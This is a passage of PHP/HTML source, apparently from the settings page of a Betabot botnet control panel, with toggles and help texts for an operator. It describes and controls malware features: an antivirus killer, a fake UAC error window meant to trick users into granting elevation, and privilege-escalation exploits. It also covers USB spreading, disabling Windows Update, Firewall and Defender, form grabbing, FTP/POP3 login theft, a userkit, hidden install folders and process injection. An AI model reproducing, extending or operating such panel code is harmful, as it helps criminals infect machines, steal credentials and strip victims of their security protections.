700px;\">\n\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_proactive_toggle\" style=\"position: relative; top: -2px;\" ";
echo $proactive_value;
echo ">\n\t\t\t\t\t\t\t\t\t\tGeneral proactive defense (";
echo $proactive_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"proactive_def\" rel=\"popover\" data-content=\"The bot's proactive defense system includes several systems that work together to prevent not only the removal of this bot but also the installation/proper functioning of other, unrelated malware that may exist on the system.\" data-original-title=\"\" href=\"#\">?</a> ] ";
if ($proactive_value == "checked") {
    echo "&nbsp;&nbsp;<font color=\"#E80000\">If you plan on downloading other bots / tools to this system, you should turn this OFF and keep it off.</font>";
}
echo "\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 730px;\">\n\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_miner_proactive_toggle\" style=\"position: relative; top: -2px;\" ";
echo $proactive_miner_value;
echo ">\n\t\t\t\t\t\t\t\t\t\tMiner proactive defense (";
echo $proactive_miner_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"proactive_miner_def\" rel=\"popover\" data-content=\"When this feature is turned ON, it will attempt to automatically disable any miner detected on the system.\" data-original-title=\"\" href=\"#\">?</a> ] ";
if ($proactive_miner_value == "checked") {
    echo "&nbsp;&nbsp;<font color=\"#E80000\">If you plan on downloading other crypto-currency miners to this system, you should turn this OFF and keep it off.</font>";
}
echo "\t\t\t\t\t\t\t\t\t</label>\n\n\t\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 280px;\">\n\t\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_betabot_proactive_toggle\" style=\"position: relative; top: -2px;\" ";
echo $antibetabot_value;
echo ">\n\t\t\t\t\t\t\t\t\t\tAnti-Betabot (Versions: 1.7.x.x / 1.6.x.x) (";
echo $antibetabot_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"proactive_betabot_def\" rel=\"popover\" data-content=\"When this feature is turned ON, it will attempt to disable critical components in instances of Betabot versions 1.6.x.x - 1.8.0.7. While the bot instances (injected and main process) will not be fully disabled/terminated/removed, instead this Betabot will disable the persistence / hook restoration / system-wide injector features so as to prevent the older Betabot versions from being able to defend themselves. Additionally, this will attempt to block any new botkill tasks from the older Betabot instances from executing properly. However, for various reasons this is not always effective.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_aggressive_proactive_toggle\" style=\"position: relative; top: -2px;\" ";
echo $proactive_agr_value;
echo ">\n\t\t\t\t\t\tAggressive antivirus disabler (";
echo $proactive_agr_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"aggressive_def\" rel=\"popover\" data-content=\"This is a separate, more aggressive system of the BDS (Bot Defense System). This will attempt to disable any antivirus solutions it detects running. In order to do this, it requires administrative privileges on Vista/7/8, and will attempt to socially-engineer the user into allowing bot to run with elevated rights. On new bots, this will not take place for at least 5 minutes after bot installation in order to not arouse suspicion.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t</label>\n\t\t\t\t\t<br />\n\n\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 440px;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_use_exploits_toggle\" style=\"position: relative; top: -2px\" ";
echo $use_privesc_exploits_value;
echo ">\n\t\t\t\t\t\tUse privilege escalation exploits to increase elevation / AVKill success rates (";
echo $use_privesc_exploits_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"forceie_pop\" rel=\"popover\" data-content=\"Enables the use of various privilege escalation exploits to help increase UAC bypass success rates, which is necessary for AVKill success. In order for the AV Killer to function, the bot must have elevated privileges, and this option could help when the other UAC bypass tricks fail.<br />-------------------------------------------------------<br />Current exploits included:<br /><strong>1.</strong> &nbsp;CVE 2015-0003 (Patched 04/2015. Windows 7 x86 only)<br /><strong>2.</strong> &nbsp;Win32k.sys / Adobe Font Type Manager zero day (CVE-2015-2387 - Patched 07/14/2015. Windows 7 x86, Windows 8.x x86 only)\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t</label>\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t";
$usb_background_color = "";
if (isset($_GET["hi"]) && $_GET["hi"] == "usb") {
    $usb_background_color = "background-color: #DBEADC;";
}
echo "\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px; ";
echo $usb_background_color;
echo "\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_usb_spread_toggle\" style=\"position: relative; top: -2px;\" ";
echo $usb_spread_value;
echo ">\n\t\t\t\t\t\tUSB Drive spreading (";
echo $usb_spread_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"usb_spread\" rel=\"popover\" data-content=\"This controls whether USB drive infection is enabled or not. By default, it is enabled. This feature works not by any autorun.inf or exploitable .LNK files, but rather by replacing the root folder objects with redirections to your bot. It is recommended you keep this on if you wish to spread your bot more easily.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t</label>\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 250px;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_components_anti_bootkit_toggle\" style=\"position: relative; top: -2px\" ";
echo $anti_bootkit_value;
echo ">\n\t\t\t\t\t\tBlock installation of common bootkits (";
echo $anti_bootkit_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"anti_bootkit\" rel=\"popover\" data-content=\"This defends against common bootkit installation techniques in user mode. While the code is hard to touch in kernel mode, this will attempt to block installation by protecting sensitive areas of the hard disk and blocking known process elevation techniques on Vista+\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t</label>\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\n\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_force_ie_toggle\" style=\"position: relative; top: -2px\" ";
echo $forceie_value;
echo ">\n\t\t\t\t\t\tForce IE as default browser (";
echo $forceie_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"forceie_pop\" rel=\"popover\" data-content=\"This forces the default browser to Internet Explorer and closes all other browsers periodically. This is to preserve the functionality of older 3rd party tools that no longer work with newer versions of other browsers besides IE.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t</label>\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -4px;\">\n\t\t\t\t\t\t\t\t<b>Reduced functionality mode:</b>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\tEnabling reduced functionality mode can improve bot reliability but also disables certain functionality, as well all system wide injection. Features disabled are:<br />\n\t\t\t\t\t\t\t\t1. Userkit<br />\n\t\t\t\t\t\t\t\t2. Formgrabber (Only if first 'reduced functionality' option is checked)<br />\n\t\t\t\t\t\t\t\t3. Live FTP/POP3 login stealer (Client info stealer remains enabled)<br />\n\t\t\t\t\t\t\t\t4. Process persistence<br />\n\t\t\t\t\t\t\t\t5. Proactive defense mode(s)<br /><br />\n\t\t\t\t\t\t\t\tIf you are running a private network, the userkit/proactive defense mode and process persistence are largely not needed. Changes take effect on reboot.\n\t\t\t\t\t\t\t\t<span style=\"position: relative; top: 7px;\">\n\t\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; position: relative; top: 6px; width: 290px;\">\n\t\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_components_toggle\" style=\"position: relative; top: -2px\" ";
echo $syscomponents_value;
echo ">\n\t\t\t\t\t\t\t\t\tEnable reduced functionality mode <i>(No injections)</i>&nbsp;&nbsp;&nbsp;[ <a id=\"no_components\" rel=\"popover\" data-content=\"Enables or disables system-wide components. These include the bot process persistence, formgrabber, live ftp login stealer and userkit.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n    </div>\n\t\n    <div id=\"pane3\" class=\"tab-pane ";
echo $active_pane == 3 ? "active" : "";
echo "\">\n\t\t<!-- Bots -->\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">Additional bot Settings</font></strong></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -4px;\">\n\t\t\t\t\t\t\t\t\t<b>Important note regarding these settings</b>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -11px;\">\n\t\t\t\t\t\t\t\t\tIt is recommended you only toggle the following settings if you know what you are doing and what each individual option below does. Typically it is not necessary to configure any of these options except for skilled users running more complicated operations to which require a finer degree of control over specific functionality. Click the question mark (?) after each option to view more detailed information on it.\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td width=\"1%\" style=\"border: 0;\">\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t&nbsp;&nbsp;<b>AV Killer</b>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t<br />\n\t\t\t\t\t<span style=\"position: relative; top: -7px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 320px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_no_ieo\" style=\"position: relative; top: -2px;\" ";
echo $adv_avk_disable_ieo_value;
echo ">\n\t\t\t\t\t\t\tDisable Image Execution Options functionality (";
echo $adv_avk_disable_ieo_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"avk_disable_ieo_def\" rel=\"popover\" data-content=\"This part of the AV/Bot killer functionality plays a minor role in its effectiveness and as time goes on has been becoming more and more detected by behavioral monitoring systems of various security products. If you notice detections for this functionality start to occur and are not addressed in a timely fashion, you can ENABLE this setting to mitigate losses until the issue is fixed.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t</label>\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"position: relative; top: 5px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_no_fakewin\" style=\"position: relative; top: -2px;\" ";
echo $adv_avk_no_fakewin_value;
echo " disabled>\n\t\t\t\t\t\t\t\tDisable UAC fake error window (";
echo $adv_avk_no_fakewin_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"avk_fakewin_def\" rel=\"popover\" data-content=\"This option toggles whether or not the fake UAC error window is shown. The fake error window is not the UAC prompt itself, but rather the 'official looking' multi-lingual window preceding it that attempts to explain why they need to accept the UAC prompt that follows. For some users who prefer 'quieter' bot operation, this may be preferable.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"position: relative; top: 10px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 440px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_no_disable_services\" style=\"position: relative; top: -2px;\" ";
echo $adv_avk_no_disable_services_value;
echo ">\n\t\t\t\t\t\t\t\tDo not disable Windows Update / Firewall / other security services and settings (";
echo $adv_avk_no_disable_services_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"avk_disable_services_def\" rel=\"popover\" data-content=\"This option toggles whether or not important services such as Windows Update, Windows Firewall, Windows Defender and so on will be turned off when the AV killer is run.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"position: relative; top: 15px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 310px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_disable_lua\" style=\"position: relative; top: -2px;\" ";
echo $adv_avk_disable_lua_value;
echo ">\n\t\t\t\t\t\t\t\tDisable Limited User Accounts (LUA) (";
echo $adv_avk_disable_lua_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"avk_disable_lua_def\" rel=\"popover\" data-content=\"Disables LUA/UAC when elevated to kill AV(s). This will allow all programs to run with elevated privileges on reboot.\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"position: relative; top: 20px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 340px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_disable_autoupdates\" style=\"position: relative; top: -2px;\" ";
echo $adv_avk_disable_autoupdates_value;
echo ">\n\t\t\t\t\t\t\t\tDisable Automatic Updates for popular browser addons (";
echo $adv_avk_disable_autoupdates_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"avk_disable_autoupdates_def\" rel=\"popover\" data-content=\"Disables automatic updates for Adobe Flash, Reader and Java. Additionally, Java Security settings are lowered. IE Blocked Addons functionality is also disabled\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t&nbsp;&nbsp;<b>Security related</b>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t<br />\n\t\t\t\t\t<span style=\"position: relative; top: -7px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 290px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_userkit_toggle\" style=\"position: relative; top: -2px;\" ";
echo $adv_userkit_value;
echo ">\n\t\t\t\t\t\t\tDisable system-wide userkit (x86 and x64) (";
echo $adv_userkit_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"userkit_def\" rel=\"popover\" data-content=\"Disables the system-wide userkit for all processes. By choosing this option, the login grabber (for FTP/POP3 logins) will also be disabled as it relies on the x86 userkit to function.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t</label>\n\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"position: relative; top: 5px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 850px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_userkit64_toggle\" style=\"position: relative; top: -2px;\" ";
echo $adv_userkit64_value;
echo ">\n\t\t\t\t\t\t\t\tDisable system-wide x64 process userkit (";
echo $adv_userkit64_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"userkit64_def\" rel=\"popover\" data-content=\"Disables the userkit for 64-bit process(es) only.\" data-original-title=\"\" href=\"#\">?</a> ] ";
if ($adv_userkit64_value == "") {
    echo "&nbsp;&nbsp;<font color=\"#E80000\">This provides little extra defense and may crash some x64 processes. It is recommended you keep the x64 kit disabled.</font>";
}
echo "\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"position: relative; top: 10px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 480px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_inj_disable_loader_injection\" style=\"position: relative; top: -2px;\" ";
echo $adv_inject_disable_loader_injection;
echo ">\n\t\t\t\t\t\t\t\tDisable bot injection into processes used by popular loaders (Smoke and Andromeda) (";
echo $adv_inject_disable_loader_injection == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"injsvchost_def\" rel=\"popover\" data-content=\"Tells the bot not to inject itself into instances of svchost.exe, msiexec.exe and wuauclt.exe running under the current user's account. This option exists primarily to allow the bot to work better with specific loaders\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />\n\t\t\t\t\t<span style=\"position: relative; top: -9px;\">\n\t\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t\t&nbsp;&nbsp;<b>Installation options</b>\n\t\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t</table>\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<span style=\"position: relative; top: -7px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 500px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_use_runonce\" style=\"position: relative; top: -2px;\" ";
echo $adv_install_use_runonce_value;
echo ">\n\t\t\t\t\t\t\t\tSet HKLM RunOnce instead of Task Scheduler for elevated reboot persistence when possible (";
echo $adv_install_use_runonce_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"runonce_def\" rel=\"popover\" data-content=\"This will attempt to set the HKEY_LOCAL_MACHINE\\...\\RunOnce startup key instead of using Task Scheduler to come back on reboot with elevated privileges. Not all circumstances will allow the bot to set this key, so when it is unable, it will use Task Scheduler instead.<br /><br />If you are using a crypter that has a long delay on launch (anti-emul / etc), then you may not want to use this option as it will make explorer hang on reboots until the crypter finishes its delay\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t\t<span style=\"position: relative; top: -3px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 570px;\">\n\t\t\t\t\t\t\t\t<!--<input type=\"checkbox\" name=\"panel_bot_use_shell_folder\" style=\"position: relative; top: -2px;\" ";
echo $adv_install_use_shell_folder;
echo ">-->\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_use_shell_folder\" style=\"position: relative; top: -2px;\" disabled=1>\n\t\t\t\t\t\t\t\tConvert bot install folder into unviewable shell folder (Read infotip under '?' before using this option!) (";
echo $adv_install_use_shell_folder == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"shellfolder_def\" rel=\"popover\" data-content=\"Enabling this option will have the bot drop a custom desktop.ini file to its install folder, which will cause the bot folder to become unviewable, as it will take on the properties of one of several explorer interfaces. Depending on the OS, the following will appear instead of bot folder contents when this option is enabled (and working properly): <i>My Computer, Recycle Bin, Power Options or Program Files.</i>.<br /><br />To be more specific, if enabled and Recycle Bin shell CLSID ends up being used, the user will see the Recycle Bin contents/interface when they open the bot folder as if they opened the Recycle Bin instead. This is assuming they get past the restrictive DACL and userkit, though.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</span>\n\n\t\t\t\t\t<br />\n\t\t\t\t\t<span style=\"position: relative; top: -9px;\">\n\t\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t\t&nbsp;&nbsp;<b>Formgrab options</b>\n\t\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t</table>\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t<span style=\"position: relative; top: -7px;\">\n\t\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 500px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_bot_fg_filter_useless_grabs\" style=\"position: relative; top: -2px;\" ";
echo $adv_formgrab_filter_useless_value;
echo ">\n\t\t\t\t\t\t\t\tTry to filter out useless formgrabs <i>(google-analytics / etc)</i> &nbsp;(";
echo $adv_formgrab_filter_useless_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"fg_filter_def\" rel=\"popover\" data-content=\"Ignores grabbed POST data from advertisement / safe-search websites\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t\t</label>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n\t\t\n\t\t<br />\n\t\t\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">Additional panel Settings</font></strong></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t&nbsp;&nbsp;<b>Debug related</b>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 10px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 300px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_debug_msg_system\" style=\"position: relative; top: -2px;\" ";
echo $adv_debug_msg_system_value;
echo ">\n\t\t\t\t\t\t\tEnable verbose bot debug messaging system (";
echo $adv_debug_msg_system_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"adv_bot_send_debug_msgs_def\" rel=\"popover\" data-content=\"This debug option tells the bot to send debug messages to the bot debug gate file. This is used to track events on each client machine to help analyze any potential issues with the client software. This option does not do anything if the builds in use do not have it enabled.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 15px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 220px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_debug_attrib\" style=\"position: relative; top: -2px;\" ";
echo $adv_debug_attributes_value;
echo ">\n\t\t\t\t\t\t\tEnable bot debug attributes (";
echo $adv_debug_attributes_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"adv_bot_send_debug_attrib_def\" rel=\"popover\" data-content=\"Controls whether or not bot will do debug attribute checks before each C2 server request. This is for debugging purposes and should not be enabled for regular use. Additionally, this option does not do anything if the builds in use do not have it enabled.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t<br />\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: 1px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t&nbsp;&nbsp;<b>Task related</b>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\t\t\t\t\t\n\t\t\t\t\t<span style=\"position: relative; top: 13px;\">\n\t\t\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 350px;\">\n\t\t\t\t\t\t\t<input type=\"checkbox\" name=\"panel_botattrib_update_on_checkin\" style=\"position: relative; top: -2px;\" ";
echo $adv_panel_update_only_on_checkin_value;
echo ">\n\t\t\t\t\t\t\tOnly send update tasks on check-in requests (";
echo $adv_panel_update_only_on_checkin_value == "checked" ? "ON" : "OFF";
echo ")&nbsp;&nbsp;&nbsp;[ <a id=\"adv_update_on_checkin_def\" rel=\"popover\" data-content=\"The first request a bot sends on each reboot of main bot instance is a panel registration request, which contains more information than a regular check in. This request is only performed once, and each subsequent request is a check in or relevant grab request. This option causes the panel to only send update tasks if the bot request is a regular check-in and not a grab/registration request.\" data-original-title=\"\" href=\"#\">?</a> ]\n\t\t\t\t\t\t</label>\n\t\t\t\t\t</span>\n\t\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t</table>\n\t\t\n\t\t<br />\n\t\t\n\t\t<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"100%\" style=\"font-size: 10px; face: font-family: Tahoma;\">\n\t\t\t<tr>\n\t\t\t\t<td><strong><font size=\"2\">Client information blob settings</font></strong></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td>\n\t\t\t\t\t<table class=\"table-bordered\" style=\"width: 900px; background-color: #F2F2F2; position: relative; top: -4px;\">\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td width=\"99%\">\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -4px;\">\n\t\t\t\t\t\t\t\t\t<b>Important note regarding info blobs</b>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<br />\n\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 6px; top: -11px;\">\n\t\t\t\t\t\t\t\t\tClient information blobs are large amounts of specific data (or for Generic blob, unspecific) that is basically unsorted. For example, the process list blob, which if set below, will instruct the bots to send the current system process list every 6 hours or so. This will allow you to see what is running on the systems. 